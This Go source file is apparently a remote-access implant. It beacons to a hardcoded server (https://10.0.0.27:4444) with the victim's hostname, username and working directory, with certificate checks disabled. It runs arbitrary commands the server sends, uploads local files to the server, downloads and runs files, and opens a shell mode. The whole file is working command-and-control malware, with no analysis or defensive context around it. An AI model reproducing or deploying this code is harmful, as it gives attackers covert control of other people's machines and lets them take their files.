package main

import (
    "net/http"
    "net/url"
    "io"
    "strings"
    "path/filepath"
    "path"
    "io/ioutil"
    "strconv"
    "encoding/json"
    "bytes"
    "mime/multipart"
    "os"
    "os/exec"
    "fmt"
    "crypto/tls"
    "time"
    "os/user"
)

var SETTINGS map[interface{}]interface{}

func init_settings() {
    SETTINGS = map[interface{}]interface{}{
        "urls":make([]string, 1),
        "attempts":"3",
        "beacon":"10",
        "err":"false",
        "err_sleep":"60",
        "line_cap":"100",
        "debug":"true",
    }
    urls := []string{"https://10.0.0.27:4444/index.php?id=1"}
    SETTINGS["urls"] = urls
    SETTINGS["url"] = urls[0]
}


/*
resp, err := http.Get("http://example.com/")
...
resp, err := http.Post("http://example.com/upload", "image/jpeg", &buf)
...
resp, err := http.PostForm("http://example.com/form",
	url.Values{"key": {"Value"}, "id": {"123"}})
*/


func ignore(err error){
    if err != nil {
        fmt.Println(err)
    }
}


func postFile(filename string, targetUrl string) error {
    bodyBuf := &bytes.Buffer{}
    bodyWriter := multipart.NewWriter(bodyBuf)

    // this step is very important
    fileWriter, err := bodyWriter.CreateFormFile(filename, filename)
    if err != nil {
        fmt.Println("error writing to buffer")
        return err
    }

    // open file handle
    fh, err := os.Open(filename)
    if err != nil {
        fmt.Println("error opening file")
        return err
    }
    defer fh.Close()

    //iocopy
    _, err = io.Copy(fileWriter, fh)
    if err != nil {
        return err
    }

    contentType := bodyWriter.FormDataContentType()
    bodyWriter.Close()

    resp, err := http.Post(targetUrl, contentType, bodyBuf)
    if err != nil {
        return err
    }
    defer resp.Body.Close()
    resp_body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        return err
    }
    fmt.Println(resp.Status)
    fmt.Println(string(resp_body))
    return nil
}

func downloadFile(filepath string, url string) (err error) {
  fmt.Printf("Filepath:%s\n", filepath)

  // Create the file
  out, err := os.Create(filepath)
  if err != nil  {
    return err
  }
  defer out.Close()

  // Get the data
  resp, err := http.Get(url)
  if err != nil {
    return err
  }
  defer resp.Body.Close()

  // Check server response
  if resp.StatusCode != http.StatusOK {
    return fmt.Errorf("bad status: %s", resp.Status)
  }

  // Writer the body to file
  _, err = io.Copy(out, resp.Body)
  if err != nil  {
    return err
  }

  return nil
}

func execute_file(c string, args[]string){
    f := c
    if !path.IsAbs(c){
      cwd, _ := os.Getwd()
      f = path.Join(cwd, f)
    }
    os.Chmod(f, os.FileMode(int(0777)) )
    execute(f, args)
}

func execute_raw(c string, args []string) ([]byte){
  //cmd := exec.Command("cmd", "/C", string("powershell.exe -Command Start-Process -Verb RunAs "+string(Command[1])));
  //cmd := exec.Command(cmd_array...)
    var cmd *exec.Cmd
    if args == nil || len(args) == 0 {
        cmd = exec.Command(c)
    } else {
        cmd = exec.Command(c, args...)
    }
  out, _ := cmd.CombinedOutput();
  return out
}

func execute(c string, args []string){
    out := execute_raw(c, args)
    str_out := string(out)
    if strings.Count(str_out, "\n") > atoi(SETTINGS["line_cap"].(string)) {
        tmp, _ := ioutil.TempFile("", "")
        defer os.Remove(tmp.Name())
        ioutil.WriteFile(tmp.Name(), out, 0644)
        send_file(tmp.Name())
    } else {
        msg := stov(c, str_out)
        send_msg(msg)
    }
}

func get_beacon() url.Values {
    user, err := user.Current()
    ignore(err)
    name, err := os.Hostname()
    ignore(err)
    dir, err := os.Getwd()
    ignore(err)
    var timestamp int32
    timestamp = int32(time.Now().Unix())

    return url.Values{"time": {fmt.Sprint(timestamp)}, "beacon": {"True"}, "hostname":{name}, "usr":{user.Username}, "cwd":{dir}}
}

// Convert key, value strings to url.Values
func stov(key string, value string) url.Values {
    return url.Values{key:{value}}
}

func send_file(filename string) {
    u, _ := url.Parse(SETTINGS["url"].(string))
    u.Path = "/upload.php"
    postFile(filename, u.String())
}

//Does this actually do anything useful?
func get_args(rec []interface{}) []interface {} {
    //rec := nil
    var j_inner []interface{}
    json.Unmarshal([]byte(rec[1].(string)), &j_inner)
    if j_inner != nil {
        fmt.Printf("Unmarshalled (inner): %s\n", j_inner)
        rec[1] = j_inner
    }
    return rec
}

func stringify(t []interface{} ) []string {
    s := make([]string, len(t))
    for i, v := range t {
        s[i] = fmt.Sprint(v)
    }
    return s
}

func do_cmd(body []byte) bool {
    fmt.Println("in do_cmd")
    var j map[string]interface{}
    json.Unmarshal(body, &j)
    if len(j) == 0 {
        return false
    }
    fmt.Printf("Unmarshalled: %s\n", j)
   
    for cmd, record := range j {
        fmt.Printf("CMD:%s\nArgs:%s\n", cmd,record)
        if cmd == "set" {
            rec := get_args(record.([]interface{}))
            if rec != nil {
                SETTINGS[rec[0]] = rec[1]
                fmt.Printf("SETTINGS['%s']:%s  (%T)\n", rec[0],rec[1], rec[1])
            }
        } else if cmd == "download" {
            //rec := get_args(record.([]interface{}))
            for _, filename := range record.([]interface{}) {
                send_file(filename.(string))
            }
        } else if cmd == "upload" {
            fmt.Printf("Fulfilling cmd: Upload\n")
            file_url := record.([]interface{})[0].(string)
            filename := record.([]interface{})[1].(string)
            
            //file_url := record.(string)
            u, _ := url.Parse(file_url)
            fmt.Printf("Path: %s", u.Path)
            if u.Path == "/" {
                u.Path = "/tmp"
            }
            /*
            filename := path.Base(u.Path)
            */
            if !path.IsAbs(filename) {
                wd, _ := os.Getwd()
                filename = filepath.Join(wd, filename)
            }
            //rec := get_args(record.([]interface{}))
            fmt.Printf("Rec: %s\n", record)
            err := downloadFile(filename, file_url)
            if err != nil{
                fmt.Println(err)
            }
        } else if cmd == "cd" {
            dir := record.([]interface{})[0].(string)
            fmt.Printf("Changing Dir: %s \n", fmt.Sprint(dir) )
            err := os.Chdir(dir)
            if err != nil {
                fmt.Printf("Err: %s \n", err)
            }
        } else if cmd == "shell_SYN" {
            shell()
        //} else if cmd == "execute" {
        } else { //assume execute
            //rec := get_args(record.([]interface{}))
            fmt.Printf("Rec: %s\n", record)
            //rec := get_args(record.([]interface{}))
            cmd_array := stringify(record.([]interface{}))
            if cmd == "execute" {
                go execute(cmd_array[0], cmd_array[1:])
            } else if cmd == "execute_file" {
                go execute_file(cmd_array[0], cmd_array[1:])
            } else {
                go execute(cmd, cmd_array)
            }
        }
       
 
    }

    return true
}


func poll_for_work(max_duration time.Duration, max_attempts int, freq time.Duration) bool{
    attempts := 0
    start := time.Now()

    for attempts < max_attempts && time.Since(start) < max_duration {
        b := get_beacon()
        cmd := send_msg(b)
        if do_cmd(cmd){
            return true
        }
    }
    return false
}

func shell() {
	cmd := send_msg(url.Values{"shell_ACK": {"True"}})
    success := "False"
    if !do_cmd(cmd) {
        // Settings are pretty arbitrary for now
        max_duration := time.Duration(atoi(SETTINGS["beacon"].(string)) * 5)
        max_attempts := 30
        freq := time.Second
        //ensure we have done the next command from the server (probably the shell) before sending shell_FIN
        if poll_for_work(max_duration, max_attempts, freq) {
            success = "True"
        }
    } else {
        success = "True"
    }
    //Give the shell a bit to start, just in case
    sleep(2)
    send_msg(url.Values{"shell_FIN": {success}})
}

func atoi(s string) int{
    i, _ := strconv.Atoi(s)
    return i
}

func sleep(sec int){
    time.Sleep(time.Duration(sec)*time.Second)
}

func send_msg(m url.Values) []byte{
    fmt.Printf("Sending Message: %s\n", m)
    err_count := 0
    attempts:= atoi(SETTINGS["attempts"].(string))
    for err_count <= attempts {
        fmt.Printf("%d attempts remaining\n", attempts - err_count)
        //urls := SETTINGS["urls"].([]string)
        //fmt.Printf("URL: %v\n", urls )
        //fmt.Printf("URL: %s\n", urls[0] )
        //resp, err := http.PostForm((SETTINGS["urls"].([]string))[0], b)
        resp, err := http.PostForm(SETTINGS["url"].(string), m)
        if err != nil {
            fmt.Println(err)
            err_count++
            time.Sleep(time.Second * 5)
        } else {
            fmt.Println(resp)
            bodyBytes, _ := ioutil.ReadAll(resp.Body)
            //fmt.Printf("Body:%s\n", string(bodyBytes))
            //do_cmd(bodyBytes)
            return bodyBytes
        }
        //break
    }
    SETTINGS["err"] = "true"
    return nil
}

func main() {
    init_settings()
    http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
    for {
        //url = "https://10.0.0.27:4444/index.php"
        //resp, err := http.Get("https://10.0.0.27:4444") 
        b := get_beacon()
        cmd := send_msg(b)
        do_cmd(cmd)
        dur := "beacon"
        if SETTINGS["err"] == "true" {
            // if an error occured, potentially sleep longer
            dur = "err_sleep"
            SETTINGS["err"] = "false"
        }
        sleep(atoi(SETTINGS[dur].(string)))
    }
}
